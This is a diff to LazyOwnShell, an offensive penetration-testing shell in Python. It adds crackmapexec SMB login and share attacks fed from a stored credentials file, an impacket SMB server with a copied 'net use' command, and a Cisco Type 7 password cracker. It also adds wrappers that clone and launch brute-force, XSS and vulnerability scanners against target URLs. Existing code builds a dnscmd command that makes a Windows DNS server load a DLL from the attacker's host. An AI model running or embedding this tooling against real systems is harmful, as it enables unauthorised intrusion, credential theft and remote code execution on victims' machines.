@@ -2962,6 +2962,8 @@ class LazyOwnShell(Cmd):
         getnvd = find_ps(line)
         packetstormsecurity(getnvd)
         os.system(f"msfconsole -q -x \"search {line}; exit\"")
+        line = line.replace(" ","+")
+        print_msg(f"To open use Ctrl + Click: {BLUE}{UNDERLINE}https://sploitus.com/?query={line}#exploits")
         return
 
     def do_wfuzz(self, line):
@@ -3241,7 +3243,7 @@ class LazyOwnShell(Cmd):
         if check_rhost(rhost):
             if line:
                 if line.startswith("rid"):
-                    path_cred = "sessions/credentials.txt"
+                    path_cred = get_credentials(True)
 
                     if not os.path.exists(path_cred):
                         username = input("    [!] Enter the username with domain (e.g., 'user@domain.com'): ").strip()
@@ -3258,7 +3260,7 @@ class LazyOwnShell(Cmd):
                     print_warn(f"Done... crackmapexec smb {rhost} -u {username} -p {password} --rid-brute")        
                     return
                 elif line.startswith("shares"):
-                    path_cred = "sessions/credentials.txt"
+                    path_cred = get_credentials(True)
 
                     if not os.path.exists(path_cred):
                         username = input("    [!] Enter the username with domain (e.g., 'user@domain.com'): ").strip()
@@ -3272,6 +3274,22 @@ class LazyOwnShell(Cmd):
                     print_msg(f"Try... crackmapexec smb {rhost} -u {username} -p {password} --shares")
                     os.system(f"crackmapexec smb {rhost} -u {username} -p {password} --shares")
                     print_warn(f"Done... crackmapexec smb {rhost} -u {username} -p '{password}' --shares")
+                    return
+                elif line.startswith("user"):
+                    path_cred = get_credentials(True)
+
+                    if not os.path.exists(path_cred):
+                        username = input("    [!] Enter the username with domain (e.g., 'user@domain.com'): ").strip()
+                        password = input("    [!] Enter the password: ").strip()
+                    else:
+                        with open(path_cred, "r") as file:
+                            for file_line in file:
+                                params = file_line.split(":")
+                                username = params[0]
+                                password = params[1].replace("\n", "")
+                    print_msg(f"Try... crackmapexec smb {rhost} -u {username} -p {password}")
+                    os.system(f"crackmapexec smb {rhost} -u {username} -p '{password}'")
+                    print_warn(f"Done... crackmapexec smb {rhost} -u {username} -p '{password}'")
                     return
 
 
@@ -3660,7 +3678,7 @@ class LazyOwnShell(Cmd):
         lhost = self.params["lhost"]
         if not check_lhost(lhost):
             return
-        choice = input(f"    [!] Enter your choice {GREEN}1) {WHITE}to file.scf attack or {GREEN}2){WHITE} to dnscmd dll attack (default: 2)") or '2'
+        choice = input(f"    [!] Enter your choice {GREEN}1) {WHITE}to file.scf attack, {GREEN}2){WHITE} to dnscmd dll attack or {GREEN}3) simple server with username (default: 2)") or '2'
         if choice == '1':
             #TODO: Refactor
             revshell = f"""[Shell]
@@ -3685,6 +3703,12 @@ class LazyOwnShell(Cmd):
             command = f"cd sessions && sudo impacket-smbserver {folder} $(pwd) -smb2support"
             print_msg(command)
             attack = f'cmd /c dnscmd localhost /config /serverlevelplugindll \\{lhost}\{folder}\da.dll'
+            copy2clip(attack)
+            os.system(command)
+        elif choice == "3":
+            command = f"cd sessions && sudo impacket-smbserver -username guest -password guest {folder} $(pwd) -smb2support"
+            print_msg(command)
+            attack = f"net use x: \\\\{lhost}\\{folder} /user:guest guest"
             copy2clip(attack)
             os.system(command)
         else:
@@ -4723,10 +4747,11 @@ class LazyOwnShell(Cmd):
     def do_banner(self, line):
         """Show the banner"""
         if NOBANNER is False:
+            os.system("python3 banner.py")
             print_msg(
                 f"    {BG_BLACK}{RED}{BANNER}{MAGENTA}Autor: {CYAN}grisUN0{RESET}"
             )
-            time.sleep(0.2)
+        
             print_msg(LazyOwnShell().intro)
         return
 
@@ -11416,7 +11441,7 @@ class LazyOwnShell(Cmd):
             debug = input("    [!] Enable debug mode? (yes/no, default: no): ").strip().lower() == "yes"
 
 
-            path_cred = "sessions/credentials.txt"
+            path_cred = get_credentials(True)
 
             if not os.path.exists(path_cred):
                 netexec_command = f"netexec {protocol} -t {threads} --timeout {timeout} --jitter {jitter} --log sessions/{rhost}_netexec.txt"
@@ -14274,12 +14299,312 @@ class LazyOwnShell(Cmd):
 
         return
 
+    def do_crack_cisco_7_password(self, line):
+        """
+        Crack a Cisco Type 7 password hash and display the plaintext.
 
+        This command takes an encrypted Cisco Type 7 password hash as input,
+        processes it to recover the original plaintext password, and prints the
+        result to the console.
+
+        Args:
+            line (str): The encrypted password hash in Cisco Type 7 format.
+
+        Returns:
+            None: The function prints the plaintext password directly to the console.
+        """
+        crypttext = line.strip()
+        plaintext = crack_password(crypttext)
+        if plaintext:
+            print_msg(f'[+] Plaintext: {plaintext} [👽]')
+        else:
+            print_warn('[-] Invalid input.')
+
+    def do_loxs(self, line):
+        """
+        Command loxs: Installs and runs Loxs for multi-vulnerability web application scanning.
+
+        This function performs the following tasks:
+        1. Checks if Loxs is already cloned in the external/.exploit directory.
+        2. Clones the Loxs repository if not present.
+        3. Installs required dependencies.
+        4. Prompts the user for a URL or file input, custom payload file, success criteria, and thread count.
+        5. Executes Loxs for scanning vulnerabilities like LFI, OR, XSS, and SQLi.
+        6. Displays real-time results and optionally saves vulnerable URLs.
+
+        Args:
+            line (str): Optional argument for specifying the input URL or file, custom payload, and additional options.
+
+        Returns:
+            None
+
+        Example:
+            loxs --url target.com
+        """
+        path = os.getcwd()
+        exploit_dir = os.path.join(path, "external/.exploit")
+        loxs_url = "https://github.com/coffinxp/loxs.git"
+        loxs_dir = os.path.join(exploit_dir, "loxs")
+        url = self.params["url"]
+        os.makedirs(exploit_dir, exist_ok=True)
+
+        if not os.path.exists(loxs_dir):
+            print_msg("Cloning Loxs repository...")
+            os.system(f"git clone {loxs_url} {loxs_dir}")
+            print_msg("Installing requirements...")
+            os.system(f"cd {loxs_dir} && pip3 install -r requirements.txt")
+            
+        else:
+            print_msg("Loxs already cloned, skipping cloning.")
+
+        command = f"cd {loxs_dir} && python3 loxs.py"
+
+        print_msg(f"Running Loxs scan: {command}")
+        os.system(command)
+        return
+
+    def do_blazy(self, line):
+        """
+        Command blazy: Installs and runs blazy for multi-vulnerability web application scanning.
+
+        This function performs the following tasks:
+        1. Checks if blazy is already cloned in the external/.exploit directory.
+        2. Clones the blazy repository if not present.
+        3. Installs required dependencies.
+        4. Prompts the user for a URL or file input, custom payload file, success criteria, and thread count.
+        5. Executes blazy for Bruteforce Login.
+        6. Displays real-time results and optionally saves vulnerable URLs.
+
+        Args:
+            line (str): Optional argument for specifying the input URL.
+
+        Returns:
+            None
+
+        Example:
+            python3 main.py -i target.com
+        """
+        path = os.getcwd()
+        exploit_dir = os.path.join(path, "external/.exploit")
+        blazy_url = "https://github.com/s0md3v/Blazy.git"
+        blazy_dir = os.path.join(exploit_dir, "blazy")
+        url = self.params["url"]
+        os.makedirs(exploit_dir, exist_ok=True)
+
+        if not os.path.exists(blazy_dir):
+            print_msg("Cloning blazy repository...")
+            os.system(f"git clone {blazy_url} {blazy_dir}")
+            print_msg("Installing requirements...")
+            os.system(f"cd {blazy_dir}")
+            
+        else:
+            print_msg("blazy already cloned, skipping cloning.")
+
+        
+        if not line:
+            target = input(f"    {GREEN}[!] Enter the target url (Default: {url}): ") or url
+        else:
+            target = line.strip()
+
+        command = f"cd {blazy_dir} && python3 main.py -i {target}"
+
+        print_msg(f"Running blazy scan: {command}")
+        os.system(command)
+        return
+
+    def do_parth(self, line):
+        """
+        Command parth: Installs and runs Parth for discovering vulnerable URLs and parameters.
+
+        This function performs the following tasks:
+        1. Checks if Parth is already cloned in the external/.exploit directory.
+        2. Clones the Parth repository if not present.
+        3. Installs required dependencies using pip3.
+        4. Prompts the user for a URL, file input, or import option and allows for custom output such as JSON or saving parameter names.
+        5. Executes Parth for scanning vulnerabilities like LFI, SSRF, SQLi, XSS, and open redirects.
+        6. Displays real-time results and optionally saves output in a file.
+
+        Args:
+            line (str): Optional argument for specifying the target domain, import file, or additional Parth options.
+
+        Returns:
+            None
+
+        Example:
+            parth -t example.com
+        """
+        path = os.getcwd()
+        exploit_dir = os.path.join(path, "external/.exploit")
+        parth_url = "https://github.com/s0md3v/Parth.git"
+        parth_dir = os.path.join(exploit_dir, "Parth")
+        domain = self.params["domain"]
+        os.makedirs(exploit_dir, exist_ok=True)
+
+        if not os.path.exists(parth_dir):
+            print_msg("Cloning Parth repository...")
+            os.system(f"git clone {parth_url} {parth_dir}")
+            print_msg("Installing Parth requirements...")
+            os.system(f"pip3 install parth")
+
+        else:
+            print_msg("Parth already cloned, skipping cloning.")
+
+
+        if not line:
+            target = input(f"    {GREEN}[!] Enter the target domain or file: (default: {domain}) ").strip() or domain
+            output = input("    [?] Do you want to save output as JSON (y/n)? ").strip().lower() or 'n'
+            json_output = f"-o {target}.json" if output == 'y' else ""
+            import_option = input("    [?] Specify an import option (e.g., -i file.history, --pipe xss, or leave blank): ").strip() or ""
+        else:
+            target = line.strip()
+            output = input("    [?] Do you want to save output as JSON (y/n)? ").strip().lower() or 'n'
+            json_output = f"-o {target}.json" if output == 'y' else ""
+            import_option = input("    [?] Specify an import option (e.g., -i file.history, --pipe xss, or leave blank): ").strip() or ""
+
+        if not target:
+            print_warn("No target provided, aborting scan.")
+            return
+
+        command = f"parth -t {target} {json_output} {import_option}"
+        print_msg(f"Running Parth scan: {command}")
+        os.system(command)
+        return
+
+    def do_breacher(self, line):
+        """
+        Command breacher: Installs and runs Breacher for finding admin login pages and EAR vulnerabilities.
+
+        This function performs the following tasks:
+        1. Checks if Breacher is already cloned in the external/.exploit directory.
+        2. Clones the Breacher repository if not present.
+        3. Installs required dependencies.
+        4. Prompts the user for a target URL, file type (php, asp, html), custom paths, and thread options.
+        5. Executes Breacher for scanning admin login pages and potential EAR vulnerabilities.
+        6. Supports multi-threading and custom paths for enhanced scanning.
+
+        Args:
+            line (str): Optional argument for specifying the target URL, file type, and additional Breacher options.
+
+        Returns:
+            None
+
+        Example:
+            breacher -u example.com --type php
+        """
+        path = os.getcwd()
+        exploit_dir = os.path.join(path, "external/.exploit")
+        breacher_url = "https://github.com/s0md3v/Breacher.git"
+        breacher_dir = os.path.join(exploit_dir, "Breacher")
+        url = self.params["url"]
+        os.makedirs(exploit_dir, exist_ok=True)
+
+        if not os.path.exists(breacher_dir):
+            print_msg("Cloning Breacher repository...")
+            os.system(f"git clone {breacher_url} {breacher_dir}")
+            print_msg("Installing Breacher requirements...")
+            os.system(f"pip3 install -r {breacher_dir}/requirements.txt")
+
+        else:
+            print_msg("Breacher already cloned, skipping cloning.")
+
+        if not line:
+            url = input(f"    [!] Enter the target URL (default: {url}): ").strip() or url
+            file_type = input("    [?] Enter the file type (php, asp, html): ").strip() or "php"
+            custom_path = input("    [?] Specify a custom path of url (optional): ").strip() or ""
+            threads = input("    [?] Enable multi-threading? (y/n): ").strip().lower() or 'n'
+            fast_flag = "--fast" if threads == 'y' else ""
+        else:
+            args = line.split()
+            url = args[0] if len(args) > 0 else ""
+            file_type = args[1] if len(args) > 1 else "php"
+            custom_path = args[2] if len(args) > 2 else ""
+            fast_flag = "--fast" if len(args) > 3 and args[3] == "--fast" else ""
+
+        if not url:
+            print_warn("No URL provided, aborting scan.")
+            return
+
+        path_flag = f"--path {custom_path}" if custom_path else ""
+        command = f"python {breacher_dir}/breacher.py -u {url} --type {file_type} {path_flag} {fast_flag}"
+
+        print_msg(f"Running Breacher scan: {command}")
+        os.system(command)
+        return
+
+    def do_xsstrike(self, line):
+        """
+        Command xsstrike: Installs and runs XSStrike for finding XSS vulnerabilities.
+
+        This function performs the following tasks:
+        1. Checks if XSStrike is already cloned in the external/.exploit directory.
+        2. Clones the XSStrike repository if not present.
+        3. Installs required dependencies.
+        4. Prompts the user for a target URL, crawling level, request method, encoding, and additional XSStrike options.
+        5. Executes XSStrike for testing vulnerabilities, supporting multiple features like fuzzing, blind XSS injection, crawling, and more.
+
+        Args:
+            line (str): Optional argument for specifying the target URL, crawling level, encoding, and other XSStrike options.
+
+        Returns:
+            None
+
+        Example:
+            xsstrike -u http://example.com/search.php?q=query --crawl -l 3
+        """
+        path = os.getcwd()
+        exploit_dir = os.path.join(path, "external/.exploit")
+        xsstrike_url = "https://github.com/s0md3v/XSStrike.git"
+        xsstrike_dir = os.path.join(exploit_dir, "XSStrike")
+        url = self.params["url"]
+        os.makedirs(exploit_dir, exist_ok=True)
+
+        if not os.path.exists(xsstrike_dir):
+            print_msg("Cloning XSStrike repository...")
+            os.system(f"git clone {xsstrike_url} {xsstrike_dir}")
+            print_msg("Installing XSStrike requirements...")
+            os.system(f"pip3 install -r {xsstrike_dir}/requirements.txt")
+        else:
+            print_msg("XSStrike already cloned, skipping cloning.")
+
+        
+
+        if not line:
+            url = input(f"    {GREEN}[!] Enter the target URL(default {url}): ").strip() or url
+            post_data = input("    [?] Enter POST data (optional): ").strip() or ""
+            encoding = input("    [?] Specify payload encoding (optional, e.g., base64): ").strip() or ""
+            crawl_level = input("    [?] Enter crawling level (optional, default is 2): ").strip() or "2"
+            fuzzer = input("    [?] Enable fuzzer? (y/n): ").strip().lower() or 'n'
+            path_flag = input("    [?] Inject payloads in the path? (y/n): ").strip().lower() or 'n'
+        else:
+            args = line.split()
+            url = args[0] if len(args) > 0 else ""
+            post_data = args[1] if len(args) > 1 else ""
+            encoding = args[2] if len(args) > 2 else ""
+            crawl_level = args[3] if len(args) > 3 else "2"
+            fuzzer = args[4] if len(args) > 4 and args[4] == "--fuzzer" else 'n'
+            path_flag = "--path" if len(args) > 5 and args[5] == "--path" else 'n'
+
+        if not url:
+            print_warn("No URL provided, aborting scan.")
+            return
+
+        data_flag = f"--data '{post_data}'" if post_data else ""
+        encode_flag = f"--encode {encoding}" if encoding else ""
+        fuzzer_flag = "--fuzzer" if fuzzer == 'y' else ""
+        crawl_flag = f"--crawl -l {crawl_level}" if crawl_level else ""
+        path_option = "--path" if path_flag == 'y' else ""
+
+        command = f"python {xsstrike_dir}/xsstrike.py -u {url} {data_flag} {encode_flag} {crawl_flag} {fuzzer_flag} {path_option}"
+
+        print_msg(f"Running XSStrike scan: {command}")
+        os.system(command)
+        return
 
 if __name__ == "__main__":
     p = LazyOwnShell()
     p.onecmd("p")
     p.onecmd("graph")
+    old = False
     if arguments:
         if arg.startswith("-c"):
             if len(arguments) == 2:
@@ -14303,8 +14628,12 @@ if __name__ == "__main__":
                 p.onecmd(f'payload {payload}')
                 p.onecmd('ipp')
                 p.onecmd("rrhost")
+        if arg.startswith("--old-banner"):
+            old = True
 
     if NOBANNER is False:
+        if not old:
+            os.system("python3 banner.py")
         print(
             f"    {RED}{BANNER}{MAGENTA}{BOLD}Autor: {CYAN}{BOLD}{BG_RED}grisUN0{RESET}"
         )
